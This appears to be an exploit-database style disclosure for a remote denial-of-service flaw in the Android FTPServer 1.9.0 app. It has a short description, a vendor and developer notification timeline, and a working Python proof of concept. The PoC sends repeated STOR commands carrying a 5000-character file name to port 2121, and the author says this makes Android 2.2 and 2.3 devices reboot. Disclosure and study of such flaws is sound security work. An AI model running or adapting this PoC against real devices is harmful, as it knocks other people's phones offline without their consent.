@@ -1,0 +1,82 @@
+# Exploit Title: Android FTPServer 1.9.0 Remote DoS
+# Date: 03/20/12
+# Author: G13
+# Twitter: @g13net
+# Software Site: https://sites.google.com/site/andreasliebigapps/ftpserver/
+# Download Link: http://www.g13net.com/ftpserver.apk
+# Version: 1.9.0
+# Category: DoS (android)
+#
+
+##### Vulnerability #####
+
+FTPServer is vulnerable to a DoS condition when long file names are
+repeatedly attempted to be written via the STOR command.
+
+Successful exploitation will causes devices to restart.
+
+Android Security Team has confirmed this issue.
+
+I have been able to test this exploit against Android 2.2 and 2.3.
+4.0 (ICS) appears not to be vulnerable.
+
+##### Vendor Timeline #####
+
+Android Security Team:
+10/20/11 - Vendor Notified of vulnerability, Vendor notifies me they will
+be looking into the issue
+10/21/11 - vendor Requests bug report from device, bug report sent, PoC
+Code Delivered to Vendor
+10/24/11 - Asked Vendor Status, stated I have been able to duplicate issue
+on multiple devices
+10/25/11 - Vendor states they are still working on it
+10/30/11 - Current Status asked
+10/31/11 - vendor Replies no updates
+11/7/11 - Emailed Vendor, they ask for more clarification on issue. I
+submit more details
+11/8/11 - Vendor acknowledges that it is not the APK itself causing the
+crashes.  Vendor also confirms full reboots from PoC code.
+11/9/11 - Vendor asks if I am just crashing application or device in
+certain instances.  I state device is restarting.
+11/11/11 - I ask if there is anything more I may assist with.  Vendor
+states they have isolated the impacted component and are working on a
+fix.
+11/18/11 - Current status Asked.
+12/8/11 - Update requested, response that they will contact Kernel team for
+an update
+01/13/12 - Current status asked, no response
+03/06/12 - Current status asked, no response
+03/20/12 - Disclosure
+
+Developer:
+1/24/12 - Developer contacted
+1/25/12 - Developer Responds
+1/27/12 - Supplied Developer with PoC code, Developer confirms issue
+1/29/12 - Developer releases new version
+3/20/12 - Disclosure
+
+##### PoC #####
+
+#!/usr/bin/python
+# Android FTPServer PoC Device Crash
+
+import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+buffer = "STOR " + "A" * 5000 + "\r\n"
+for x in xrange(1,31):
+ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+ print x
+ s.connect(('172.16.30.108',2121))
+
+ data=s.recv(1024)
+ s.send("USER test\r\n")
+ data=s.recv(1024)
+ s.send("PASS test\r\n")
+
+ s.send(buffer)
+
+ s.send("QUIT")
+
+ s.close()
